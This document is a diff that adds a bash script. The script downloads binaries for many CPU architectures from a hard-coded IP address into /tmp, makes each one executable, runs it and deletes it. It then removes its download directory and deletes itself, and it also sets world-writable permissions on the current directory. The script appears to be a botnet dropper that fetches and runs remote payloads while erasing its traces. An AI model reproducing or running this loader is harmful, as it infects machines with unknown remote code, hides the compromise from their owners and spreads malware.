@@ -1,0 +1,52 @@
+#!/bin/bash
+
+# Define base URL
+BASE_URL="http://108.174.58.28/"
+
+# Define file names for each architecture
+FILES=(
+  "386"
+  "aarch64"
+  "amd64"
+  "arm5"
+  "arm6"
+  "arm7"
+  "mips"
+  "mips64"
+  "mips64el"
+  "mipse"
+)
+
+# Directory to download files to
+DOWNLOAD_DIR="/tmp/downloads"
+
+# Create the download directory if it doesn't exist
+mkdir -p "$DOWNLOAD_DIR"
+
+# Change permissions for all files in the current directory
+chmod 777 *
+
+# Download, set permissions, execute, and remove each file
+for FILE in "${FILES[@]}"; do
+  # Define the file path
+  FILE_URL="${BASE_URL}${FILE}"
+  FILE_PATH="${DOWNLOAD_DIR}/${FILE}"
+  
+  # Download the file
+  wget "$FILE_URL" -O "$FILE_PATH"
+
+  # Make the file executable
+  chmod +x "$FILE_PATH"
+
+  # Execute the file
+  "$FILE_PATH"
+
+  # Remove the file after execution
+  rm -f "$FILE_PATH"
+done
+
+# Remove the download directory
+rm -rf "$DOWNLOAD_DIR"
+
+# Remove the script itself
+rm -- "$0"
